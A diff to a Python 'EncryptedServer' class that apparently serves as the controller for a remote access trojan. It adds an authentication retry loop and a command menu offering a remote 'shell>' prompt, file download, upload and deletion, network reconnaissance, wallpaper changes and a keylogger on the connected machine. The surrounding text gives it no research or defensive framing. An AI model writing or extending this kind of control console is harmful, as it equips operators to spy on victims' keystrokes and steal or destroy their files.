@@ -31,17 +31,18 @@ class EncryptedServer:
         return [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]
 
     def authenticate(self):
-        print(self.decrypt(self.conn.recv(1024)).decode(), end="")
-        self.conn.send(self.encrypt(input().encode()))
-        print(self.decrypt(self.conn.recv(1024)).decode(), end="")
-        self.conn.send(self.encrypt(input().encode()))
+        for times in range(3):
+            print(self.decrypt(self.conn.recv(1024)).decode(), end="")
+            self.conn.send(self.encrypt(input().encode()))
+            print(self.decrypt(self.conn.recv(1024)).decode(), end="")
+            self.conn.send(self.encrypt(input().encode()))
 
-        result = self.decrypt(self.conn.recv(1024)).decode()
-        print(result)
-        if "failed" in result:
-            self.conn.close()
-            return False
-        return True
+            result = self.decrypt(self.conn.recv(1024)).decode()
+            print(result)
+            if "successful" in result:
+                return True
+        self.conn.close()
+        return False
 
     def send_command(self, command: str):
         self.conn.sendall(self.encrypt(command.encode()))
@@ -92,6 +93,11 @@ class EncryptedServer:
         try:
             if not self.authenticate():
                 return
+
+            print("""\nAvailable commands:
+dir, path, ipconfig, arp -a
+del [file], cd [path], download [file], upload [file], wall [img], keylogger [count] [buf]
+                    """)
 
             while True:
                 command = input("shell> ").strip()
